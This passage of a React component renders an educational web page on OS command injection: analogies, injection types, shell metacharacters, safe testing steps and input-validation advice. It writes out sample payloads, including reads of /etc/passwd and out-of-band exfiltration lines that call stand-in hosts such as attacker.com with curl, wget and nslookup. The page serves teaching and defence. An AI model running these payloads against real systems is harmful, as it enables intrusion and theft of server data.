        <Typography variant="caption" sx={{ color: 'text.secondary', mb: 2, display: 'block' }}>
          {progressPercent}% complete
        </Typography>
        <Divider sx={{ mb: 2 }} />
        <List dense>
          {sectionNavItems.map((item) => (
            <ListItem key={item.id} disablePadding sx={{ mb: 0.5 }}>
              <Box
                onClick={() => scrollToSection(item.id)}
                sx={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: 1.5,
                  py: 1,
                  px: 2,
                  borderRadius: 2,
                  cursor: 'pointer',
                  width: '100%',
                  bgcolor: activeSection === item.id ? alpha(ACCENT_COLOR, 0.1) : 'transparent',
                  borderLeft: activeSection === item.id ? `3px solid ${ACCENT_COLOR}` : '3px solid transparent',
                  '&:hover': { bgcolor: alpha(ACCENT_COLOR, 0.05) },
                }}
              >
                <Box sx={{ color: activeSection === item.id ? ACCENT_COLOR : 'text.secondary' }}>
                  {item.icon}
                </Box>
                <Typography
                  variant="body2"
                  sx={{
                    fontWeight: activeSection === item.id ? 600 : 400,
                    color: activeSection === item.id ? ACCENT_COLOR : 'text.primary',
                  }}
                >
                  {item.label}
                </Typography>
              </Box>
            </ListItem>
          ))}
        </List>
      </Drawer>

      <Box sx={{ display: 'flex', gap: 4, maxWidth: 1400, mx: 'auto', px: { xs: 2, md: 3 }, py: 4 }}>
        {/* Sidebar Navigation - Desktop */}
        {sidebarNav}

        {/* Main Content */}
        <Box sx={{ flex: 1, minWidth: 0 }}>
        {/* Header */}
        <Box id="intro" sx={{ mb: 4 }}>
          <Chip
            component={Link}
            to="/learn"
            icon={<ArrowBackIcon />}
            label="Back to Learning Hub"
            clickable
            variant="outlined"
            sx={{ borderRadius: 2, mb: 2 }}
          />
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
            <Box
              sx={{
                width: 64,
                height: 64,
                borderRadius: 2,
                bgcolor: alpha("#ef4444", 0.1),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
              }}
            >
              <TerminalIcon sx={{ fontSize: 36, color: "#ef4444" }} />
            </Box>
            <Box>
              <Typography variant="h4" sx={{ fontWeight: 800 }}>
                Command Injection
              </Typography>
              <Typography variant="body1" color="text.secondary">
                OS Command Execution Attacks
              </Typography>
            </Box>
          </Box>
          <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
            <Chip label="Web Security" color="error" size="small" />
            <Chip label="OWASP A03" size="small" sx={{ bgcolor: alpha("#f59e0b", 0.1), color: "#f59e0b" }} />
            <Chip label="Critical" size="small" sx={{ bgcolor: alpha("#ef4444", 0.1), color: "#ef4444" }} />
          </Box>
        </Box>

        {/* Beginner Introduction */}
        <Paper sx={{ p: 3, mb: 4, borderRadius: 3, bgcolor: alpha("#22c55e", 0.06), border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e", display: "flex", alignItems: "center", gap: 1 }}>
            🌱 New to Command Injection? Start Here
          </Typography>
          <Typography variant="body1" sx={{ lineHeight: 1.9, mb: 2 }}>
            Imagine you're at a hotel front desk, and you ask the receptionist to call a taxi for you. The receptionist picks up the phone and dials "Call taxi for Room 205." But what if you said: <strong>"Call taxi for Room 205; also unlock the safe"</strong>? If the receptionist blindly followed your entire instruction, they'd unlock the safe too!
          </Typography>
          <Typography variant="body1" sx={{ lineHeight: 1.9, mb: 2 }}>
            <strong>Command injection</strong> works the same way. When a web application runs commands on its server (like pinging a network address or converting a file), it's like the receptionist making calls. If the application blindly includes user input in those commands without checking it first, an attacker can sneak in extra commands—just like sneaking "unlock the safe" into your taxi request.
          </Typography>
          <Typography variant="body1" sx={{ lineHeight: 1.9 }}>
            This is one of the most dangerous web vulnerabilities because successful exploitation gives attackers the ability to run <em>any</em> command on the server—reading files, installing malware, stealing data, or completely taking over the machine.
          </Typography>
        </Paper>

        {/* Overview */}
        <Paper id="overview" sx={{ p: 3, mb: 4, borderRadius: 3, border: `1px solid ${alpha(theme.palette.divider, 0.1)}` }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <TerminalIcon color="error" /> What is Command Injection?
          </Typography>
          <Typography variant="body1" color="text.secondary" sx={{ lineHeight: 1.8, mb: 2 }}>
            Command injection occurs when an application passes unsafe user input to a system shell. Attackers 
            can inject shell metacharacters to execute arbitrary OS commands, potentially gaining full control 
            of the server. It's one of the most severe web vulnerabilities, consistently ranking in the OWASP Top 10.
          </Typography>
          <Typography variant="body1" color="text.secondary" sx={{ lineHeight: 1.8, mb: 2 }}>
            <strong>How does it happen?</strong> Many web applications need to interact with the operating system—checking if a server is reachable (ping), converting document formats, processing images, or running backups. Developers often do this by constructing a command string and passing it to the system shell.
          </Typography>
          <Typography variant="body1" color="text.secondary" sx={{ lineHeight: 1.8, mb: 2 }}>
            For example, a network diagnostic tool might run: <code>ping -c 4 [user_input]</code>. If a user enters <code>google.com</code>, the command becomes <code>ping -c 4 google.com</code>—perfectly safe. But if a user enters <code>google.com; cat /etc/passwd</code>, the command becomes <code>ping -c 4 google.com; cat /etc/passwd</code>—now it pings Google AND reveals the server's user list!
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ lineHeight: 1.8, mt: 2 }}>
            It frequently shows up in admin tools, diagnostic endpoints, and automation features that wrap OS utilities. 
            Even when the command itself is fixed, <strong>option injection</strong> can still alter behavior and expose sensitive data by manipulating command-line flags.
          </Typography>

          {/* Visual Example */}
          <Box sx={{ mt: 3, p: 2, bgcolor: alpha("#000", 0.03), borderRadius: 2 }}>
            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
              📍 Visual Example: How a Simple Ping Tool Becomes Dangerous
            </Typography>
            <Box sx={{ fontFamily: "monospace", fontSize: "0.85rem", lineHeight: 1.8 }}>
              <Box sx={{ mb: 1 }}>
                <Typography component="span" sx={{ color: "#22c55e", fontWeight: 600 }}>✓ Normal Use: </Typography>
                <code>User enters: 192.168.1.1</code>
              </Box>
              <Box sx={{ mb: 1, pl: 2, color: "text.secondary" }}>
                → Server runs: <code>ping -c 4 192.168.1.1</code>
              </Box>
              <Box sx={{ mb: 1 }}>
                <Typography component="span" sx={{ color: "#ef4444", fontWeight: 600 }}>✗ Attack: </Typography>
                <code>User enters: 192.168.1.1; whoami</code>
              </Box>
              <Box sx={{ pl: 2, color: "text.secondary" }}>
                → Server runs: <code>ping -c 4 192.168.1.1; whoami</code>
                <br />
                → The <code>;</code> tells the shell "run this command too!"
              </Box>
            </Box>
          </Box>
        </Paper>

        {/* Why This Matters Section */}
        <Paper sx={{ p: 3, mb: 4, borderRadius: 3, bgcolor: alpha("#ef4444", 0.04), border: `1px solid ${alpha("#ef4444", 0.15)}` }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <WarningIcon sx={{ color: "#ef4444" }} /> Why Command Injection is So Dangerous
          </Typography>
          <Typography variant="body1" sx={{ lineHeight: 1.9, mb: 2 }}>
            Unlike many vulnerabilities that only affect one part of an application, command injection gives attackers direct access to the operating system. Here's what an attacker can typically do:
          </Typography>
          <Grid container spacing={2}>
            <Grid item xs={12} sm={6}>
              <Box sx={{ p: 2, bgcolor: alpha("#ef4444", 0.05), borderRadius: 2, height: "100%" }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#ef4444", mb: 1 }}>🔓 System Access</Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
                  Read sensitive files like <code>/etc/passwd</code>, configuration files with database credentials, private keys, and application secrets.
                </Typography>
              </Box>
            </Grid>
            <Grid item xs={12} sm={6}>
              <Box sx={{ p: 2, bgcolor: alpha("#ef4444", 0.05), borderRadius: 2, height: "100%" }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#ef4444", mb: 1 }}>📦 Data Theft</Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
                  Exfiltrate databases, customer records, intellectual property, and business-critical information to external servers.
                </Typography>
              </Box>
            </Grid>
            <Grid item xs={12} sm={6}>
              <Box sx={{ p: 2, bgcolor: alpha("#ef4444", 0.05), borderRadius: 2, height: "100%" }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#ef4444", mb: 1 }}>🚪 Backdoor Installation</Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
                  Download and execute malware, create new user accounts, install persistent backdoors for future access.
                </Typography>
              </Box>
            </Grid>
            <Grid item xs={12} sm={6}>
              <Box sx={{ p: 2, bgcolor: alpha("#ef4444", 0.05), borderRadius: 2, height: "100%" }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#ef4444", mb: 1 }}>🌐 Lateral Movement</Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
                  Pivot to other machines on the network, compromise additional systems, escalate privileges to root/admin.
                </Typography>
              </Box>
            </Grid>
          </Grid>
        </Paper>

        {/* Injection Types */}
        <Typography id="injection-types" variant="h5" sx={{ fontWeight: 700, mb: 2 }}>🎯 Injection Types</Typography>
        
        {/* Beginner explanation for injection types */}
        <Paper sx={{ p: 3, mb: 3, borderRadius: 3, bgcolor: alpha("#22c55e", 0.06), border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
          <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
            Understanding the Three Types
          </Typography>
          <Typography variant="body2" sx={{ lineHeight: 1.9, mb: 2 }}>
            Command injection comes in three flavors, each requiring different techniques to detect and exploit. Think of them like different ways of getting feedback when you're testing if a lock can be picked:
          </Typography>
          <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
            • <strong>Direct:</strong> You can see the lock open (you see the command output directly)<br/>
            • <strong>Blind:</strong> You can't see, but you can hear a click after 5 seconds (time-based detection)<br/>
            • <strong>Out-of-Band:</strong> You can't see or hear anything, but your phone buzzes when the lock opens (external notification)
          </Typography>
        </Paper>

        <Grid container spacing={2} sx={{ mb: 3 }}>
          {injectionTypes.map((type) => (
            <Grid item xs={12} md={4} key={type.title}>
              <Paper
                sx={{
                  p: 2,
                  height: "100%",
                  borderRadius: 2,
                  border: `1px solid ${alpha(type.color, 0.2)}`,
                  "&:hover": { borderColor: type.color },
                }}
              >
                <Typography variant="subtitle1" sx={{ fontWeight: 700, color: type.color, mb: 0.5 }}>
                  {type.title}
                </Typography>
                <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                  {type.description}
                </Typography>
                <Box sx={{ p: 1, bgcolor: alpha(type.color, 0.05), borderRadius: 1, fontFamily: "monospace", fontSize: "0.8rem" }}>
                  {type.example}
                </Box>
              </Paper>
            </Grid>
          ))}
        </Grid>

        {/* Detailed breakdown of each type */}
        <Paper sx={{ p: 3, mb: 4, borderRadius: 3, border: `1px solid ${alpha(theme.palette.divider, 0.1)}` }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 3 }}>
            Deep Dive: Each Injection Type Explained
          </Typography>

          {/* Direct Injection */}
          <Box sx={{ mb: 4 }}>
            <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#ef4444", mb: 2 }}>
              1. Direct Injection (Classic/In-Band)
            </Typography>
            <Typography variant="body2" sx={{ lineHeight: 1.9, mb: 2 }}>
              This is the most straightforward type. The output of your injected command appears directly in the application's response—either on the web page, in an API response, or in downloaded content. It's like shouting into a cave and hearing your echo back immediately.
            </Typography>
            <Typography variant="body2" sx={{ lineHeight: 1.9, mb: 2 }}>
              <strong>Example Scenario:</strong> A web app has a "Server Status" feature that shows the result of <code>ping</code>. You enter <code>127.0.0.1; ls -la</code> and suddenly see a directory listing alongside the ping results. Congratulations (if you're a pentester) or alarm bells (if you're a defender)—you've found direct command injection.
            </Typography>
            <Box sx={{ p: 2, bgcolor: alpha("#ef4444", 0.05), borderRadius: 2, fontFamily: "monospace", fontSize: "0.8rem" }}>
              <Typography variant="caption" sx={{ color: "#ef4444", fontWeight: 600 }}>Direct Injection Payload Examples:</Typography><br/>
              <code>; id</code> — Append and view user identity<br/>
              <code>| cat /etc/passwd</code> — Pipe output to file read<br/>
              <code>$(whoami)</code> — Inline command substitution
            </Box>
          </Box>

          {/* Blind Injection */}
          <Box sx={{ mb: 4 }}>
            <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#f59e0b", mb: 2 }}>
              2. Blind Injection (Time-Based)
            </Typography>
            <Typography variant="body2" sx={{ lineHeight: 1.9, mb: 2 }}>
              Sometimes the application doesn't show you the command output—maybe it processes something in the background, or the output goes to a log file you can't access. In these cases, you inject commands that cause <strong>observable side effects</strong>, typically time delays.
            </Typography>
            <Typography variant="body2" sx={{ lineHeight: 1.9, mb: 2 }}>
              <strong>Example Scenario:</strong> A form processes your input but just shows "Request submitted." You try <code>test; sleep 10</code>. If the response takes 10 seconds longer than normal, the command executed! You've confirmed blind injection. It's like sending a secret message that says "wait 10 seconds before replying"—if they wait, you know they read it.
            </Typography>
            <Typography variant="body2" sx={{ lineHeight: 1.9, mb: 2 }}>
              <strong>Extracting data blindly</strong> is trickier but possible. You can use conditional sleep: <code>if [ $(whoami | cut -c1) = "r" ]; then sleep 5; fi</code>. If it sleeps, the username starts with 'r'. Repeat for each character. Tedious? Yes. Effective? Absolutely.
            </Typography>
            <Box sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2, fontFamily: "monospace", fontSize: "0.8rem" }}>
              <Typography variant="caption" sx={{ color: "#f59e0b", fontWeight: 600 }}>Blind Injection Payload Examples:</Typography><br/>
              <code>; sleep 10</code> — 10-second delay proves execution<br/>
              <code>| ping -c 10 127.0.0.1</code> — ~10 second delay on Unix<br/>
              <code>&amp; timeout 10</code> — Windows delay command
            </Box>
          </Box>

          {/* Out-of-Band */}
          <Box>
            <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#8b5cf6", mb: 2 }}>
              3. Out-of-Band (OOB) Injection
            </Typography>
            <Typography variant="body2" sx={{ lineHeight: 1.9, mb: 2 }}>
              Sometimes you can't see output AND timing isn't reliable (maybe the server is slow anyway, or async processing masks delays). Out-of-band injection makes the vulnerable server reach out to <strong>your controlled server</strong>. When you receive that connection, you've confirmed command execution.
            </Typography>
            <Typography variant="body2" sx={{ lineHeight: 1.9, mb: 2 }}>
              <strong>Example Scenario:</strong> You set up a listener at <code>attacker.com</code>. You inject <code>; curl http://attacker.com/$(whoami)</code>. Moments later, your server receives a request to <code>/www-data</code>. Boom—not only did you confirm execution, you also extracted the username! This technique can exfiltrate entire files.
            </Typography>
            <Typography variant="body2" sx={{ lineHeight: 1.9, mb: 2 }}>
              DNS-based OOB is even more powerful because DNS often bypasses firewalls that block HTTP: <code>; nslookup $(whoami).attacker.com</code>. Your DNS server logs the subdomain, revealing the command output.
            </Typography>
            <Box sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2, fontFamily: "monospace", fontSize: "0.8rem" }}>
              <Typography variant="caption" sx={{ color: "#8b5cf6", fontWeight: 600 }}>OOB Injection Payload Examples:</Typography><br/>
              <code>; curl http://attacker.com/$(id)</code> — HTTP callback with data<br/>
              <code>; nslookup $(cat /etc/hostname).evil.com</code> — DNS exfiltration<br/>
              <code>; wget http://attacker.com/?d=$(base64 /etc/passwd)</code> — File exfiltration
            </Box>
          </Box>
        </Paper>

        {/* Common Entry Points */}
        <Paper id="entry-points" sx={{ p: 3, mb: 4, borderRadius: 3, border: `1px solid ${alpha(theme.palette.divider, 0.1)}` }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <TerminalIcon color="error" /> Common Entry Points
          </Typography>
          
          {/* Beginner explanation */}
          <Box sx={{ bgcolor: alpha("#22c55e", 0.06), p: 2, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
            <Typography variant="body2" sx={{ lineHeight: 1.8 }}>
              <strong>Where to look for command injection?</strong> Any feature that interacts with the operating system is a potential target. When you see an input field that triggers file operations, network actions, or format conversions, ask yourself: "Could my input end up in a shell command?" Here are the most common places vulnerabilities hide:
            </Typography>
          </Box>

          <Grid container spacing={2}>
            {commonEntryPoints.map((entry) => (
              <Grid item xs={12} sm={6} md={4} key={entry.title}>
                <Box sx={{ p: 2, borderRadius: 2, bgcolor: alpha(theme.palette.primary.main, 0.04), height: "100%" }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 0.5 }}>
                    {entry.title}
                  </Typography>
                  <Typography variant="body2" color="text.secondary">
                    {entry.examples}
                  </Typography>
                </Box>
              </Grid>
            ))}
          </Grid>

          {/* Real-world scenarios */}
          <Box sx={{ mt: 3 }}>
            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
              🎯 Real-World Attack Scenarios
            </Typography>
            <Grid container spacing={2}>
              <Grid item xs={12} md={6}>
                <Box sx={{ p: 2, bgcolor: alpha("#ef4444", 0.04), borderRadius: 2 }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 600, mb: 1 }}>PDF Generator Exploit</Typography>
                  <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
                    A report feature uses <code>wkhtmltopdf</code> with a user-supplied filename. Attacker enters: <code>report$(whoami).pdf</code>. The system creates <code>reportwww-data.pdf</code>, revealing the server user.
                  </Typography>
                </Box>
              </Grid>
              <Grid item xs={12} md={6}>
                <Box sx={{ p: 2, bgcolor: alpha("#ef4444", 0.04), borderRadius: 2 }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 600, mb: 1 }}>Image Resize Attack</Typography>
                  <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
                    An image upload uses ImageMagick: <code>convert uploaded.png -resize [width]x[height] output.png</code>. Attacker sets width to <code>100|touch /tmp/pwned</code>, creating a marker file proving code execution.
                  </Typography>
                </Box>
              </Grid>
            </Grid>
          </Box>
        </Paper>

        {/* Shell Metacharacters */}
        <Paper
          id="metacharacters"
          sx={{
            p: 3,
            mb: 4,
            borderRadius: 3,
            background: `linear-gradient(135deg, ${alpha("#ef4444", 0.05)}, ${alpha("#f59e0b", 0.05)})`,
            border: `1px solid ${alpha("#ef4444", 0.2)}`,
          }}
        >
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <CodeIcon sx={{ color: "#ef4444" }} /> Shell Metacharacters
          </Typography>

          {/* Beginner explanation */}
          <Box sx={{ bgcolor: alpha("#fff", 0.5), p: 2, borderRadius: 2, mb: 3 }}>
            <Typography variant="body2" sx={{ lineHeight: 1.9, mb: 2 }}>
              <strong>What are metacharacters?</strong> These are special characters that have meaning to the shell beyond their literal representation. When you type <code>;</code> in a shell, it doesn't print a semicolon—it tells the shell "that's the end of one command, start the next one." Attackers exploit these to escape from the intended command.
            </Typography>
            <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
              Think of metacharacters as <strong>magic words</strong> in the shell's language. Learning them is essential for both exploiting and preventing command injection. Here's your cheat sheet:
            </Typography>
          </Box>

          <Grid container spacing={1} sx={{ mb: 3 }}>
            {shellMetacharacters.map((m) => (
              <Grid item xs={6} sm={3} key={m.char}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                  <Chip label={m.char} size="small" sx={{ fontFamily: "monospace", fontWeight: 700, minWidth: 50 }} />
                  <Typography variant="caption" color="text.secondary">{m.use}</Typography>
                </Box>
              </Grid>
            ))}
          </Grid>

          {/* Detailed explanations of key metacharacters */}
          <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
            📖 Understanding Each Metacharacter
          </Typography>
          
          <Grid container spacing={2}>
            <Grid item xs={12} md={6}>
              <Box sx={{ p: 2, bgcolor: alpha("#fff", 0.7), borderRadius: 2, mb: 2 }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 600 }}>
                  <code style={{ color: "#ef4444" }}>;</code> Semicolon — Sequential Execution
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.7, mt: 1 }}>
                  Runs commands one after another, regardless of whether the first succeeds. <code>ping 1.1.1.1; whoami</code> runs ping, then whoami. The most common injection character.
                </Typography>
              </Box>
              <Box sx={{ p: 2, bgcolor: alpha("#fff", 0.7), borderRadius: 2, mb: 2 }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 600 }}>
                  <code style={{ color: "#ef4444" }}>&amp;&amp;</code> AND — Conditional Success
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.7, mt: 1 }}>
                  Runs the second command <strong>only if</strong> the first succeeds. <code>ping 1.1.1.1 &amp;&amp; whoami</code> only runs whoami if ping works. Useful when you need the first command to complete.
                </Typography>
              </Box>
              <Box sx={{ p: 2, bgcolor: alpha("#fff", 0.7), borderRadius: 2 }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 600 }}>
                  <code style={{ color: "#ef4444" }}>||</code> OR — Conditional Failure
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.7, mt: 1 }}>
                  Runs the second command <strong>only if</strong> the first fails. <code>false || whoami</code> always runs whoami. Useful for bypassing when the original command might fail.
                </Typography>
              </Box>
            </Grid>
            <Grid item xs={12} md={6}>
              <Box sx={{ p: 2, bgcolor: alpha("#fff", 0.7), borderRadius: 2, mb: 2 }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 600 }}>
                  <code style={{ color: "#ef4444" }}>|</code> Pipe — Output Redirection
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.7, mt: 1 }}>
                  Sends output from one command as input to another. <code>cat /etc/passwd | head</code> reads the file and shows the first 10 lines. Attackers use this to chain commands.
                </Typography>
              </Box>
              <Box sx={{ p: 2, bgcolor: alpha("#fff", 0.7), borderRadius: 2, mb: 2 }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 600 }}>
                  <code style={{ color: "#ef4444" }}>$(cmd)</code> Command Substitution
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.7, mt: 1 }}>
                  Executes <code>cmd</code> and replaces it with the output. <code>echo "User: $(whoami)"</code> embeds the username. This can inject commands anywhere in a string!
                </Typography>
              </Box>
              <Box sx={{ p: 2, bgcolor: alpha("#fff", 0.7), borderRadius: 2 }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 600 }}>
                  <code style={{ color: "#ef4444" }}>`cmd`</code> Backticks (Legacy Substitution)
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.7, mt: 1 }}>
                  Older syntax for command substitution. <code>echo "User: `whoami`"</code> does the same as <code>$()</code>. Often overlooked by filters, making it useful for bypasses.
                </Typography>
              </Box>
            </Grid>
          </Grid>
        </Paper>

        {/* Attack Flow */}
        <Paper id="testing-flow" sx={{ p: 3, mb: 4, borderRadius: 3, bgcolor: alpha(theme.palette.primary.main, 0.03), border: `1px solid ${alpha(theme.palette.primary.main, 0.15)}` }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <SecurityIcon sx={{ color: theme.palette.primary.main }} /> Safe Testing Flow
          </Typography>
          
          {/* Beginner explanation */}
          <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 2, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
            <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
              <strong>Testing safely is crucial.</strong> Unlike a lab environment, you're often testing production systems. A careless payload like <code>rm -rf /</code> could destroy real data. Always use <strong>non-destructive payloads</strong> that prove execution without causing damage. Think of it as proving you could pick a lock without actually taking anything from the room.
            </Typography>
          </Box>

          <Box component="ol" sx={{ pl: 2, "& li": { mb: 2 } }}>
            {attackFlow.map((step, index) => (
              <li key={step}>
                <Typography variant="body2" sx={{ fontWeight: 600 }}>{step}</Typography>
                {index === 0 && (
                  <Typography variant="body2" color="text.secondary" sx={{ mt: 0.5, pl: 1 }}>
                    Look for input fields that trigger server-side actions: file processing, network operations, search features, or any "Run" or "Execute" buttons.
                  </Typography>
                )}
                {index === 1 && (
                  <Typography variant="body2" color="text.secondary" sx={{ mt: 0.5, pl: 1 }}>
                    Check the technology stack and code patterns. Python's <code>os.system()</code>, PHP's <code>exec()</code>, or Node's child_process with <code>shell: true</code> are red flags.
                  </Typography>
                )}
                {index === 2 && (
                  <Typography variant="body2" color="text.secondary" sx={{ mt: 0.5, pl: 1 }}>
                    Start with <code>; echo VRA_TEST</code> or <code>; sleep 5</code>. If you see "VRA_TEST" or a 5-second delay, you've confirmed the vulnerability.
                  </Typography>
                )}
                {index === 3 && (
                  <Typography variant="body2" color="text.secondary" sx={{ mt: 0.5, pl: 1 }}>
                    Even without shell metacharacters, inputs like <code>--help</code> or <code>-v</code> might trigger unexpected behavior. Test for option injection too.
                  </Typography>
                )}
                {index === 4 && (
                  <Typography variant="body2" color="text.secondary" sx={{ mt: 0.5, pl: 1 }}>
                    Record exactly what you injected, what happened, and recommend specific fixes like using subprocess with list arguments instead of shell=True.
                  </Typography>
                )}
              </li>
            ))}
          </Box>
        </Paper>

        {/* Safe Test Payloads */}
        <Typography id="test-payloads" variant="h5" sx={{ fontWeight: 700, mb: 2 }}>Safe Test Payloads</Typography>
        
        {/* Explanation */}
        <Paper sx={{ p: 3, mb: 3, borderRadius: 3, bgcolor: alpha("#22c55e", 0.06), border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
          <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
            🎯 Why Use Specific Test Payloads?
          </Typography>
          <Typography variant="body2" sx={{ lineHeight: 1.9, mb: 2 }}>
            A good test payload should be <strong>harmless</strong>, <strong>detectable</strong>, and <strong>reliable</strong>. You want to prove the vulnerability exists without causing damage. Here's the thought process:
          </Typography>
          <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
            • <strong>echo/print statements:</strong> Unique strings like "VRA_TEST" are easy to search for in responses<br/>
            • <strong>Identity commands:</strong> <code>whoami</code>, <code>id</code>, <code>hostname</code> reveal server context<br/>
            • <strong>Time delays:</strong> <code>sleep 5</code> proves execution even without visible output<br/>
            • <strong>Callbacks:</strong> HTTP/DNS requests to your server confirm execution with data exfiltration
          </Typography>
        </Paper>

        <Grid container spacing={2} sx={{ mb: 4 }}>
          {safeTestPayloads.map((payload) => (
            <Grid item xs={12} md={6} key={payload.label}>
              <Paper sx={{ p: 2, borderRadius: 2, border: `1px solid ${alpha("#10b981", 0.2)}` }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#10b981" }}>
                  {payload.label}
                </Typography>
                <Box sx={{ p: 1, bgcolor: alpha("#10b981", 0.08), borderRadius: 1, fontFamily: "monospace", fontSize: "0.8rem", mb: 1 }}>
                  {payload.payload}
                </Box>
                <Typography variant="caption" color="text.secondary">
                  {payload.note}
                </Typography>
              </Paper>
            </Grid>
          ))}
        </Grid>

        {/* Input Validation Patterns */}
        <Typography id="validation" variant="h5" sx={{ fontWeight: 700, mb: 2 }}>Input Validation Patterns</Typography>
        
        {/* Detailed explanation */}
        <Paper sx={{ p: 3, mb: 3, borderRadius: 3, bgcolor: alpha("#22c55e", 0.06), border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
          <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
            📚 Understanding Input Validation
          </Typography>
          <Typography variant="body2" sx={{ lineHeight: 1.9, mb: 2 }}>
            Input validation is your first line of defense. The golden rule: <strong>never trust user input</strong>. Even if it looks like a simple IP address or filename, it could contain malicious metacharacters.
          </Typography>
          <Typography variant="body2" sx={{ lineHeight: 1.9, mb: 2 }}>
            <strong>Allowlist vs Blocklist:</strong> Always prefer allowlists (accepting only known-good patterns) over blocklists (rejecting known-bad characters). Blocklists inevitably miss edge cases, encoding tricks, and new attack vectors. An allowlist of "only digits and dots for IP addresses" catches everything a blocklist might miss.
          </Typography>
          <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
            <strong>Regular expressions</strong> are powerful for validation, but they must be strict. A regex like <code>^[0-9.]+$</code> ensures only digits and dots—no semicolons, pipes, or backticks can sneak through. Remember: validate what you <em>want</em>, not what you <em>don't want</em>.
          </Typography>
        </Paper>

        <Grid container spacing={2} sx={{ mb: 4 }}>
          {validationPatterns.map((pattern) => (
            <Grid item xs={12} md={6} key={pattern.label}>
              <Paper sx={{ p: 2.5, borderRadius: 2, border: `1px solid ${alpha("#3b82f6", 0.2)}` }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#3b82f6", mb: 1 }}>
                  {pattern.label}
                </Typography>
                <Box sx={{ p: 1.5, bgcolor: alpha("#000", 0.04), borderRadius: 1, fontFamily: "monospace", fontSize: "0.75rem" }}>
                  {pattern.example}
                </Box>
              </Paper>
            </Grid>
          ))}
        </Grid>

        {/* Detection Signals */}
        <Paper
          id="detection"
          sx={{
            p: 3,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#f59e0b", 0.05),
            border: `1px solid ${alpha("#f59e0b", 0.2)}`,
          }}
        >
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <WarningIcon sx={{ color: "#f59e0b" }} /> Detection Signals
          </Typography>

          {/* Beginner explanation */}
          <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 2, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
            <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
              <strong>How do you know if someone is attacking your system?</strong> Command injection attempts leave traces—error messages, unusual timing, network traffic, and file system changes. Security tools monitor these signals, and as a defender, knowing what to look for helps you catch attacks early. As a penetration tester, these same signals tell you if your payloads are working.
            </Typography>
          </Box>

